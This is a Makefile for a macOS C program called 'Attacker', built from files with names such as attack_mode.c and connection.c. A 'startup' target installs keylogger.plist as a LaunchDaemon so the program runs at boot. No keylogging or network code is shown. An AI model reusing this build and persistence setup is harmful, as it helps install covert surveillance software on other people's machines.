CC = gcc
#CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES = Attacker_main.c
EXECUTABLE = Attacker
PLIST=keylogger.plist
INSTALLDIR = /Users/$USER
COMP_FLAG = -std=c99 -Wall

all: $(SOURCES)
	$(CC) $(SOURCES) utilities.c start_menu.c md5.c entering_to_Ospy.c connection.c attack_mode.c -o $(EXECUTABLE)

install:
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm /Library/LaunchDaemons/$(PLIST)

startup:
	cp $(PLIST) /Library/LaunchDaemons

clean:
	rm $(EXECUTABLE)